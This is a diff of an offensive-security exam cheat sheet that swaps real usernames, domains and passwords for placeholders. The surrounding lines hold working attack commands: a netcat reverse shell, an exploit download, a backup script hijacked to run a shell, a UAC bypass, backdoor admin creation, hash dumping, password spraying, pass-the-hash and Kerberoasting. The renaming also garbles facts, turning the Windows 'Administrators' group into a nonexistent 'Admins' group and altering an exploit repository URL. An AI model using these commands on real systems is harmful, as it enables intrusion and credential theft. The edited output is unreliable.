@@ -1,4 +1,4 @@
-## OSCP Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>
+## example Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>
 ## If anything is missing refer here
 ````
 https://github.com/0xsyr0/oscp
@@ -320,7 +320,7 @@ max@sorcerer:~$
 #### Telnet port 23
 ##### Login
 ````
-telnet -l james 10.2.2.23
+telnet -l jess 10.2.2.23
 ````
 #### SMTP port 25
 ````
@@ -919,14 +919,14 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 ````
 ##### Crackmapexec
 ````
-proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
-proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
+proxychains crackmapexec mssql -d example.com -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
+proxychains crackmapexec mssql -d example.com -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
 
 ````
 ##### Logging in
 ````
 sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
-proxychains sqsh -S 10.10.126.148 -U oscp.exam\\sql_svc -P Dolphin1 -D msdb #windows
+proxychains sqsh -S 10.10.126.148 -U example.com\\sql_svc -P Dolphin1 -D msdb #windows
 ````
 ##### Expliotation
 ````
@@ -1019,8 +1019,8 @@ crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
 ````
 ###### logging in
 ````
-xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:dmzadmin /p:SlimGodhoodMope
-xfreerdp /u:dmzadmin  /v:192.168.238.191 /cert:ignore /p:"SlimGodhoodMope"  /timeout:20000 /drive:home,/tmp
+xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
+xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
 ````
 #### Postgresql port 5432,5433
 ##### RCE
@@ -1903,7 +1903,7 @@ Access is denied. In this case try Invoke-WebRequest for powershell
 ### SMB Shares Windows to Windows
 ````
 In this situation we have logged onto computer A
-sudo impacket-psexec Administrator:'December31'@192.168.203.141 cmd.exe
+sudo impacket-psexec Admin:'December31'@192.168.203.141 cmd.exe
 C:\Windows\system32> ipconfig
  
 Windows IP Configuration
@@ -1928,7 +1928,7 @@ Ethernet adapter Ethernet1:
 ````
 #### Accessing $C Drive of Computer A
 ````
-*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Administrator December31
+*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin December31
 ````
 #### Copying over files
 ````
@@ -2275,10 +2275,10 @@ This command creates an SSH tunnel between your local computer and a remote comp
 Lets say you have compromised host 192.168.236.147 which has access to 10.10.126.148, you could access the mssql server on port 1433 locally by doing a local port forward as seen below. This will essence allow you to access to the mssql port on your local machine with out needing proxychains.
 ````
 ````
-ssh -L 1433:10.10.126.148:1433 Administrator@192.168.236.147 -N
+ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
 ````
 ````
-sqsh -S 127.0.0.1 -U oscp.exam\\sql_svc -P Dolphin1 -D msdb
+sqsh -S 127.0.0.1 -U example.com\\sql_svc -P Dolphin1 -D msdb
 ````
 #### Bi-directional ssh tunnel
 ````
@@ -2286,7 +2286,7 @@ In this example we are 192.168.45.191 attacking an AD exploit chain with interna
 ````
 ##### arp -a
 ````
- sudo impacket-psexec Administrator:December31@192.168.236.147 cmd.exe
+ sudo impacket-psexec Admin:December31@192.168.236.147 cmd.exe
 ````
 ````
 We are using the arp -a on MS01 to show where we got some of the IPs, internal and external facing when going through this exploit chain.
@@ -2315,24 +2315,24 @@ Interface: 10.10.126.147 --- 0x8
 ````
 ##### Local Port Foward
 ````
-Sets up local port forwarding. It instructs SSH to listen on port 1433 on the local machine and forward any incoming traffic to the destination IP address 10.10.126.148 on port 1433. Administrator@192.168.236.147: Specifies the username (Administrator) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
+Sets up local port forwarding. It instructs SSH to listen on port 1433 on the local machine and forward any incoming traffic to the destination IP address 10.10.126.148 on port 1433. Admin@192.168.236.147: Specifies the username (Admin) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
 ````
 ````
-ssh -L 1433:10.10.126.148:1433 Administrator@192.168.236.147 -N
+ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
 ````
 ````
 In our next command we are able to login as the sql_svc on 10.10.126.148 (MS02) as if we were 192.168.236.147 (MS01)
 ````
 ````
-sqsh -S 127.0.0.1 -U oscp.exam\\sql_svc -P Dolphin1 -D msdb
+sqsh -S 127.0.0.1 -U example.com\\sql_svc -P Dolphin1 -D msdb
 ````
 ##### Reverse Port Foward
 ````
 -R 10.10.126.147:7781:192.168.45.191:18890: Sets up reverse port forwarding. It instructs SSH to listen on IP 10.10.126.147 and port 7781 on the remote server, and any incoming traffic received on this port should be forwarded to the IP 192.168.45.191 and port 18890.
-administrator@192.168.236.147: Specifies the username (administrator) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
+Admin@192.168.236.147: Specifies the username (Admin) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
 ````
 ````
-sudo ssh -R 10.10.126.147:7781:192.168.45.191:18890 administrator@192.168.236.147 -N
+sudo ssh -R 10.10.126.147:7781:192.168.45.191:18890 Admin@192.168.236.147 -N
 ````
 ##### RCE
 ````
@@ -2738,7 +2738,7 @@ chmod +x PwnKit #local
 ````
 #### CVE-2021-4034
 ````
-wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
+wget https://raw.githubusercontent.com/jamesammond/CVE-2021-4034/main/CVE-2021-4034.py
 ````
 #### [CVE-2012-0056] memodipper
 ````
@@ -3275,13 +3275,13 @@ C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
 C:\Backup>icacls TFTP.EXE
 icacls TFTP.EXE
 TFTP.EXE BUILTIN\Users:(I)(F)
-         BUILTIN\Administrators:(I)(F)
+         BUILTIN\Admins:(I)(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          NT AUTHORITY\Authenticated Users:(I)(M)
 ````
 ````
 BUILTIN\Users: The built-in "Users" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
-BUILTIN\Administrators: The built-in "Administrators" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
+BUILTIN\Admins: The built-in "Admins" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
 NT AUTHORITY\SYSTEM: The "SYSTEM" account has "Full Control" (F) and "Inherit" (I) permissions on the file.
 NT AUTHORITY\Authenticated Users: Authenticated users have "Modify" (M) and "Inherit" (I) permissions on the file.
 ````
@@ -3346,7 +3346,7 @@ accesschk.exe /accepteula -ucqv upnphost #command
 upnphost
   RW NT AUTHORITY\SYSTEM
         SERVICE_ALL_ACCESS
-  RW BUILTIN\Administrators
+  RW BUILTIN\Admins
         SERVICE_ALL_ACCESS
   RW NT AUTHORITY\Authenticated Users
         SERVICE_ALL_ACCESS
@@ -3419,7 +3419,7 @@ C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe 
 ````
 ### User Account Control (UAC) Bypass
 UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
-allows an administrator user to bypass UAC by silently elevating our integrity level from medium
+allows an Admin user to bypass UAC by silently elevating our integrity level from medium
 to high. As we will soon demonstrate, the fodhelper.exe509 binary runs as high integrity on Windows 10
 1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the
 Windows Registry. More specifically, it interacts with registry keys that can be modified without
@@ -3464,7 +3464,7 @@ C:\Windows\system32>fodhelper.exe #victim machine
 whoami /groups
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
 ````
-### Scripts being run by administrator
+### Scripts being run by Admin
 ````
 typically this exploit will require manual enumeration. I was able to find a directory called C:\backup\Scripts\<vulnerable script>
 ````
@@ -3476,12 +3476,12 @@ dir /q
 
  Directory of C:\backup\Scripts
 
-04/15/2023  07:20 PM    <DIR>          JAMES\james            .
-04/15/2023  07:20 PM    <DIR>          JAMES\james            ..
-04/15/2023  07:20 PM                 0 JAMES\james            '
-04/15/2023  07:29 PM               782 BUILTIN\Administrators backup_perl.pl
-05/02/2019  05:34 AM               229 BUILTIN\Administrators backup_powershell.ps1
-05/02/2019  05:31 AM               394 BUILTIN\Administrators backup_python.py
+04/15/2023  07:20 PM    <DIR>          JAMES\jess            .
+04/15/2023  07:20 PM    <DIR>          JAMES\jess            ..
+04/15/2023  07:20 PM                 0 JAMES\jess            '
+04/15/2023  07:29 PM               782 BUILTIN\Admins backup_perl.pl
+05/02/2019  05:34 AM               229 BUILTIN\Admins backup_powershell.ps1
+05/02/2019  05:31 AM               394 BUILTIN\Admins backup_python.py
                4 File(s)          1,405 bytes
                2 Dir(s)   4,792,877,056 bytes free
 ````
@@ -3491,7 +3491,7 @@ type backup_perl.pl
 
 use File::Copy;
 
-my $dir = 'C:\Users\Administrator\Work';
+my $dir = 'C:\Users\Admin\Work';
 
 # Print the current user
 system('whoami');
@@ -3502,7 +3502,7 @@ while (my $file = readdir(DIR)) {
     # We only want files
     next unless (-f "$dir/$file");
 
-    $filename =  "C:\\Users\\Administrator\\Work\\$file";
+    $filename =  "C:\\Users\\Admin\\Work\\$file";
     $output = "C:\\backup\\perl\\$file";
     copy($filename, $output);
 }
@@ -3521,7 +3521,7 @@ close($FH);
 
 use File::Copy;
 
-my $dir = 'C:\Users\Administrator\Work';
+my $dir = 'C:\Users\Admin\Work';
 
 # Get the current user
 my $user = `whoami`;
@@ -3536,7 +3536,7 @@ while (my $file = readdir(DIR)) {
     # We only want files
     next unless (-f "$dir/$file");
 
-    $filename =  "C:\\Users\\Administrator\\Work\\$file";
+    $filename =  "C:\\Users\\Admin\\Work\\$file";
     $output = "C:\\backup\\perl\\$file";
     copy($filename, $output);
 }
@@ -3552,7 +3552,7 @@ close($FH);
 ````
 ##### Results
 ````
-Current user: james\administrator
+Current user: jess\Admin
 Backup performed using Python at : 2023-04-15T19:28:41.597000
 Backup performed using Python at : 2023-04-15T19:31:41.606000
 Backup performed using Python at : 2023-04-15T19:34:41.661000
@@ -3566,7 +3566,7 @@ use the msfvenom shell you used to get initial access to elevate privs with this
 
 use File::Copy;
 
-my $dir = 'C:\Users\Administrator\Work';
+my $dir = 'C:\Users\Admin\Work';
 
 # Get the current user
 my $user = `whoami`;
@@ -3575,8 +3575,8 @@ chomp $user;
 # Print the current user to the console
 print "Current user: $user\n";
 
-# Execute cmd /c C:\\Users\james\Desktop\shell.exe
-exec('cmd /c C:\\Users\james\\Desktop\\shell.exe');
+# Execute cmd /c C:\\Users\jess\Desktop\shell.exe
+exec('cmd /c C:\\Users\jess\\Desktop\\shell.exe');
 
 opendir(DIR, $dir) or die $!;
 
@@ -3584,7 +3584,7 @@ while (my $file = readdir(DIR)) {
     # We only want files
     next unless (-f "$dir/$file");
 
-    $filename =  "C:\\Users\\Administrator\\Work\\$file";
+    $filename =  "C:\\Users\\Admin\\Work\\$file";
     $output = "C:\\backup\\perl\\$file";
     copy($filename, $output);
 }
@@ -3607,7 +3607,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>whoami
 whoami
-james\administrator
+jess\Admin
 ````
 ### Service Information Binary Exploitation
 #### Winpeas - Interesting Services -non Microsoft-
@@ -3619,7 +3619,7 @@ Possible DLL Hijacking in binary folder: C:\DevelopmentExectuables (Everyone [Al
 ````
 icacls auditTracker.exe
 auditTracker.exe Everyone:(I)(F)
-		 BUILTIN\Administrators:(I)(F)
+		 BUILTIN\Admins:(I)(F)
 		 NT AUTHORITY\SYSTEM:(I)(F)
 		 BUILTIN\USERS:(I)(RX)
 		 NT AUTHORITY\Authenticated Users:(I)(M)
@@ -3659,9 +3659,9 @@ C:\Program Files\Zen>dir /q
 
  Directory of C:\Program Files\Zen
 
-02/15/2021  02:00 PM    <DIR>          BUILTIN\Administrators .
+02/15/2021  02:00 PM    <DIR>          BUILTIN\Admins .
 02/15/2021  02:00 PM    <DIR>          NT SERVICE\TrustedInsta..
-02/10/2021  02:24 PM    <DIR>          BUILTIN\Administrators Zen Services
+02/10/2021  02:24 PM    <DIR>          BUILTIN\Admins Zen Services
 03/10/2023  12:05 PM             7,168 EXAM\ted               zen.exe
                1 File(s)          7,168 bytes
                3 Dir(s)   4,013,879,296 bytes free
@@ -3716,7 +3716,7 @@ shutdown /r /t 0 /f #sometimes it takes a minute or two...
 ### Adding a user with high privs
 ````
 net user hacker password /add
-net localgroup Administrators hacker /add
+net localgroup Admins hacker /add
 net localgroup "Remote Desktop Users" hacker /add
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 net users #check the new user
@@ -3726,8 +3726,8 @@ impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes
 rdekstop -u hacker -p password <IP of victim machine>
 windows + R #Windows and R key at the same time
 [cmd.exe] # enter exe file you want in the prompt
-C:\Windows\System32\cmd.exe #or find the file in the file system and run it as Administrator
-[right click and run as administrator]
+C:\Windows\System32\cmd.exe #or find the file in the file system and run it as Admin
+[right click and run as Admin]
 ````
 ### SeImpersonate
 #### JuicyPotatoNG
@@ -3810,13 +3810,13 @@ net users
 User accounts for \\BETHANY
 
 -------------------------------------------------------------------------------
-Administrator            alice                    Bethany                  
+Admin            alice                    Bethany                  
 Guest                    
 The command completed successfully
 ````
 ````
 C:\Users\Bethany\Desktop>net user alice
-Local Group Memberships      *Administrators       
+Local Group Memberships      *Admins       
 Global Group memberships     *None                 
 The command completed successfully.
 ````
@@ -3867,7 +3867,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Querying 192.168.214.122 for information about domain.
 Name                  Email                           PasswordLastSet      LastLogon           
 --------------------  ------------------------------  -------------------  -------------------
-Administrator                                         2023-05-19 17:01:26.839372  2020-11-04 00:58:40.654236 
+Admin                                         2023-05-19 17:01:26.839372  2020-11-04 00:58:40.654236 
 Guest                                                 <never>              <never>             
 krbtgt                                                2020-11-04 00:26:23.099902  <never>             
 rplacidi                                              2020-11-04 00:35:05.106274  <never>             
@@ -3934,7 +3934,7 @@ tree /f C:\Users\ #look for interesting files, backups etc.
 ````
 ##### Sam, System, Security Files
 ````
-whoami /all #BUILTIN\Administrators
+whoami /all #BUILTIN\Admins
 ````
 ````
 reg save hklm\security c:\security
@@ -3955,7 +3955,7 @@ c:\system z:\loot
 ````
 ````
 samdump2 SYSTEM SAM                                                                                                                     
-*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -3974,8 +3974,8 @@ creddump7 - Python tool to extract credentials and secrets from Windows registry
 ├── pwdump.py
 └── __pycache_
 
-./pwdump.py /home/kali/Documents/OSCP/OSCPA/10.10.124.142/loot/SYSTEM /home/kali/Documents/OSCP/OSCPA/10.10.124.142/loot/SAM    
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
+Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
@@ -3990,7 +3990,7 @@ hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
 ````
 ##### impacket-secretsdump
 ````
-impacket-secretsdump Administrator:'password'@$IP -outputfile hashes
+impacket-secretsdump Admin:'password'@$IP -outputfile hashes
 ````
 ````
 https://crackstation.net/
@@ -4000,10 +4000,10 @@ hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
 $DCC2$10240#username#hash
 ````
 ````
-$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7
-$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
-$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
-$DCC2$10240#joe#464f388c3fe52a0fa0a6c8926d62059c
+$DCC2$10240#Admin#a7c5480e8c1ef0ffec54e99275e6e0f7
+$DCC2$10240#luke#cd21be418f01f5591ac8df1fdeaa54b6
+$DCC2$10240#warren#b82706aff8acf56b6c325a6c2d8c338a
+$DCC2$10240#jess#464f388c3fe52a0fa0a6c8926d62059c
 ````
 ````
 hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt
@@ -4077,8 +4077,8 @@ Address: 10.11.1.121
 ````
 ###### SMB
 ````
-impacket-psexec joe:Flowers1@172.16.138.11 cmd.exe
-impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.129.59
+impacket-psexec jess:Flowers1@172.16.138.11 cmd.exe
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Admin@192.168.129.59
 impacket-psexec -hashes lm:ntlm zensvc@192.168.183.170
 ````
 ###### WINRM
@@ -4095,8 +4095,8 @@ impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
 ````
 rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d OFFSEC
 xfreerdp /v:10.1.1.89 /u:xavier /pth:5e22b03be22022754bf0975251e1e7ac
-xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:dmzadmin /p:SlimGodhoodMope
-xfreerdp /u:dmzadmin  /v:192.168.238.191 /cert:ignore /p:"SlimGodhoodMope"  /timeout:20000 /drive:home,/tmp
+xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
+xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
 ````
 ###### Accessing shares with RDP
 ````
@@ -4109,25 +4109,25 @@ Enter Password
 #### AD attacks
 ##### Spray and Pray
 ````
-sudo crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-sudo crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+sudo crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
+sudo crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d example.com
 sudo crackmapexec smb 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-success
-sudo proxychains crackmapexec smb 10.10.124.140 -u Administrator -p hghgib6vHT3bVWf  -x whoami --local-auth
-sudo proxychains crackmapexec winrm 10.10.124.140 -u Administrator -p hghgib6vHT3bVWf  -x whoami --local-auth
-sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-sudo crackmapexec winrm 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+sudo proxychains crackmapexec smb 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
+sudo proxychains crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
+sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
+sudo crackmapexec winrm 192.168.50.75 -u dave -p 'Flowers1' -d example.com
 sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
-proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
+proxychains crackmapexec mssql -d example.com -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
 ````
 ````
-.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+.\kerbrute_windows_amd64.exe passwordspray -d example.com .\usernames.txt "password123"
 ````
 ##### Pass-the-hash
 ````
-crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
-crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
-crackmapexec smb 10.11.1.20-24 -u tris -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svcorp.com -x whoami
-proxychains crackmapexec smb 10.10.126.146 -u 'Administrator' -H '59b280ba707d22e3ef0aa587fc29ffe5' -x whoami -d oscp.exam
+crackmapexec smb 10.11.1.120-124 -u admin -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
+crackmapexec smb 10.11.1.20-24 -u pat -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
+crackmapexec smb 10.11.1.20-24 -u tim -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svexample.com -x whoami
+proxychains crackmapexec smb 10.10.126.146 -u 'Admin' -H '59b280ba707d22e3ef0aa587fc29ffe5' -x whoami -d example.com
 ````
 ##### TGT Impersonation
 ````
@@ -4139,7 +4139,7 @@ PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
 ````
 ##### AS-REP Roasting
 ````
-impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast example.com/pete
 ````
 ````
 cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
@@ -4152,7 +4152,7 @@ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr
 ````
 ##### Kerberoasting
 ````
-sudo impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip 192.168.50.70 corp.com/pete
+sudo impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip 192.168.50.70 example.com/user
 ````
 ````
 .\Rubeus.exe kerberoast /simple /outfile:hashes.kerberoast
